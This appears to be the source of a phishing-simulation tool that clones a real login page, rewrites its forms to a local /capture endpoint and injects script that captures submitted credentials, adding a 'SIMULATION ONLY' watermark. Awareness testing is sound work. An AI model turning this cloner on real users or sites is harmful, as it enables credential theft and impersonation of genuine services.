"""
cloner.py — Fetches a login page and rewrites it to POST credentials
            to the local capture endpoint instead of the real server.
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import re

CAPTURE_ENDPOINT = "/capture"

INJECT_SCRIPT = """
<script>
// PhishSim: intercept form submission and POST to capture endpoint
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            var data = new FormData(form);
            var obj = {};
            data.forEach(function(v, k) { obj[k] = v; });
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(obj)
            }).then(function(r) { return r.json(); })
              .then(function(resp) {
                  if (resp.redirect) window.location.href = resp.redirect;
              });
        });
    });
});
</script>
"""

def _inline_styles(soup, base_url):
    """
    Attempt to fetch and inline external stylesheets so the page
    renders correctly without needing internet access.
    """
    for link in soup.find_all("link", rel="stylesheet"):
        href = link.get("href")
        if not href:
            continue
        full_url = urljoin(base_url, href)
        try:
            r = requests.get(full_url, timeout=5)
            if r.status_code == 200:
                style_tag = soup.new_tag("style")
                style_tag.string = r.text
                link.replace_with(style_tag)
        except Exception:
            pass  # leave the original link tag if fetch fails


def _rewrite_form_actions(soup):
    """
    Rewrite all <form action="..."> attributes to point to the capture
    endpoint on the local server. The JS intercept handles actual
    submission, but this is a belt-and-suspenders fallback.
    """
    for form in soup.find_all("form"):
        form["action"] = CAPTURE_ENDPOINT
        form["method"] = "post"


def _add_capture_script(soup):
    """Inject the JS intercept before </body>."""
    script_tag = BeautifulSoup(INJECT_SCRIPT, "html.parser")
    body = soup.find("body")
    if body:
        body.append(script_tag)
    else:
        soup.append(script_tag)


def clone_page(url: str, output_path: str, redirect_url: str = "https://example.com/awareness"):
    """
    Fetch `url`, rewrite forms to capture on localhost, inject
    redirect URL into capture response, and save to `output_path`.
    """
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (X11; Linux x86_64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/120.0.0.0 Safari/537.36"
        )
    }

    try:
        resp = requests.get(url, headers=headers, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        raise RuntimeError(f"Failed to fetch {url}: {e}")

    soup = BeautifulSoup(resp.text, "html.parser")

    # Inline CSS for offline serving
    _inline_styles(soup, url)

    # Rewrite form actions
    _rewrite_form_actions(soup)

    # Store the redirect URL as a data attribute on body so the server
    # can pass it back in the /capture response
    body = soup.find("body")
    if body:
        body["data-redirect"] = redirect_url

    # Inject JS intercept
    _add_capture_script(soup)

    # Add a visible "SIMULATION" watermark so testers can always identify the page
    watermark = soup.new_tag("div")
    watermark["style"] = (
        "position:fixed;bottom:12px;right:12px;"
        "background:rgba(220,50,50,0.85);color:#fff;"
        "font-family:monospace;font-size:11px;padding:4px 10px;"
        "border-radius:4px;z-index:9999;pointer-events:none;"
    )
    watermark.string = "PHISHSIM — SIMULATION ONLY"
    if body:
        body.append(watermark)

    with open(output_path, "w", encoding="utf-8") as f:
        f.write(str(soup))

    return output_path
